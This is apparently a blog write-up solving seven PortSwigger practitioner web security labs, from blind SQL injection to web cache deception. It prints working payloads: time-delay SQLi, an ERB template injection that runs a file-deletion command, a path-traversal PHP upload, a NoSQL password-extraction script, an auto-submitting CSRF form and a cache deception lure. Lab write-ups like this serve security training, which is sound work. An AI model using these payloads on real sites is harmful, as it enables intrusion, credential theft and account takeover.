---
title: "7 PortSwigger Practitioner Labs Solved — SSRF to Web Cache Deception"
date: 2026-04-02T02:00:00+05:30
lastmod: 2026-04-02T02:00:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
featureimage: img/portswigger.png
simg: img/portswigger.png
categories:
  - PortSwigger
tags:
  - portswigger
  - web-security-academy
  - sqli
  - ssti
  - nosql
  - csrf
  - file-upload
  - access-control
  - web-cache-deception
  - bug-bounty
  - pentesting
draft: false
description: "Solving 7 PortSwigger Practitioner labs covering blind SQLi, SSTI, access control bypass, file upload traversal, NoSQL injection, CSRF method bypass, and web cache deception — with payloads and bug bounty tips."
---

## Overview

Seven Practitioner-level labs solved across seven different vulnerability categories. Each technique is directly applicable to real-world bug bounty hunting.

## Lab 1: Blind SQLi with Time Delays

**Vulnerability:** Tracking cookie value injected into SQL query. No visible output.

**Payload:**
```
Cookie: TrackingId=x'||pg_sleep(10)--
```

**Result:** Response delayed by 10 seconds, confirming PostgreSQL injection.

**Bug Bounty Tip:** Always test cookies, not just form fields. Time-based blind SQLi via `pg_sleep()` (PostgreSQL), `SLEEP()` (MySQL), `WAITFOR DELAY` (MSSQL), or `dbms_pipe.receive_message` (Oracle).

---

## Lab 2: Basic SSTI (ERB Template Injection)

**Vulnerability:** User input rendered through ERB (Ruby) template engine via `message` parameter.

**Detection:** `<%= 7*7 %>` renders as `49`.

**Exploitation:**
```
GET /?message=<%25%3d+system("rm+/home/carlos/morale.txt")+%25>
```

**Bug Bounty Tip:** Test `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` on any parameter reflected in the page. Error pages, email templates, and PDF generators are common SSTI targets. Use [tplmap](https://github.com/epinna/tplmap) for automation.

---

## Lab 3: Access Control Bypass via X-Original-URL

**Vulnerability:** Front-end blocks `/admin` path, but back-end framework reads the path from `X-Original-URL` header.

**Exploit:**
```http
GET /?username=carlos HTTP/1.1
Host: target.com
X-Original-URL: /admin/delete
```

**Bug Bounty Tip:** When you get 403 on admin paths, try these headers:
- `X-Original-URL: /admin`
- `X-Rewrite-URL: /admin`
- `X-Forwarded-Prefix: /admin`

Also try method override: `X-HTTP-Method-Override: PUT` or `?_method=DELETE`.

---

## Lab 4: File Upload RCE via Path Traversal

**Vulnerability:** Server prevents PHP execution in `/files/avatars/` directory, but doesn't sanitize path traversal in filenames.

**Exploit:** Upload with filename `..%2fexploit.php` — URL-encoded `../` places the file in `/files/` where PHP executes.

```
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**Access:** `GET /files/exploit.php` — returns the secret.

**Bug Bounty Tip:** When file uploads exist but execution is blocked, try path traversal in the filename: `../shell.php`, `..%2fshell.php`, `....//shell.php`. Also try double extensions: `shell.php.jpg`, `shell.pHp`.

---

## Lab 5: NoSQL Injection — Data Extraction

**Vulnerability:** MongoDB `$where` style injection in user lookup endpoint.

**Exploitation:** Boolean-based character extraction:

```python
# Find password length
/user/lookup?user=administrator' && this.password.length == 8 || 'a'=='b

# Extract each character  
/user/lookup?user=administrator' && this.password[0]=='y
/user/lookup?user=administrator' && this.password[1]=='s
# ... iterate a-z for each position
```

**Automated with Python:**

```python
password = ""
for pos in range(pw_len):
    for char in string.ascii_lowercase:
        payload = f"administrator' && this.password[{pos}]=='{char}"
        r = s.get(f"{LAB}/user/lookup?user={quote(payload)}")
        if 'administrator' in r.text:
            password += char
            break
```

**Bug Bounty Tip:** Test JSON APIs for MongoDB operators: `{"username": {"$ne": ""}}` for auth bypass, `{"$regex": "^a"}` for data extraction. NoSQL injection is common in Node.js + MongoDB stacks.

---

## Lab 6: CSRF — Token Validation Depends on Method

**Vulnerability:** CSRF token is validated on POST requests but **not on GET**. Converting the request method bypasses the token check.

**Exploit:**
```html
<form action="https://target.com/my-account/change-email">
    <input type="hidden" name="email" value="hacked@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

The form submits as GET (no `method="POST"` specified), so CSRF token is never checked.

**Bug Bounty Tip:** When CSRF token blocks your attack:
1. Try **removing the token entirely** — some apps only validate if present
2. **Change POST to GET** — token may only be checked on POST
3. **Use another user's token** — tokens may not be tied to sessions
4. **Change Content-Type** to `text/plain` — may bypass framework protection

---

## Lab 7: Web Cache Deception via Path Delimiters

**Vulnerability:** Origin server uses `;` as path delimiter, but cache doesn't. So `/my-account;anything.js` serves the dynamic account page but cache stores it as static `.js`.

**Attack Chain:**
1. Craft URL: `/my-account;wcd123.js`
2. Send victim to this URL (via exploit server)
3. Cache stores victim's account page
4. Attacker accesses same URL — gets victim's cached data

**Payload:**
```html
<script>document.location="https://target/my-account;wcd123.js"</script>
```

**Steal API key from cached response:**
```
GET /my-account;wcd123.js HTTP/1.1
X-Cache: hit
→ Contains victim's API key
```

**Bug Bounty Tip:** Test path delimiter discrepancies between origin and cache: `;`, `%23`, `%3f`, `%00`. If the origin treats `;` as a delimiter but CDN doesn't, you can cache any page as a static file. This is a **high-severity** finding because it leaks authenticated data.

---

## Severity Quick Reference

| Technique | Typical Severity | Where to Test |
|---|---|---|
| Blind SQLi (time) | P1-P2 | Cookies, headers, hidden params |
| SSTI | P1 (RCE) | Any reflected parameter, error pages |
| Access control (header bypass) | P1 | Admin paths blocked by 403 |
| File upload traversal | P1 (RCE) | Any file upload feature |
| NoSQL injection | P1-P2 | JSON APIs, login forms |
| CSRF method bypass | P2-P3 | State-changing actions |
| Web cache deception | P2-P3 | Any CDN-fronted authenticated page |

## Lab Links

- [Blind SQLi Time Delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
- [Basic SSTI](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)
- [URL-based Access Control Bypass](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)
- [File Upload via Path Traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)
- [NoSQL Injection Extract Data](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data)
- [CSRF Method Bypass](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)
- [Web Cache Deception Path Delimiters](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-delimiters)

---

*Techniques documented here are for authorized security testing only.*
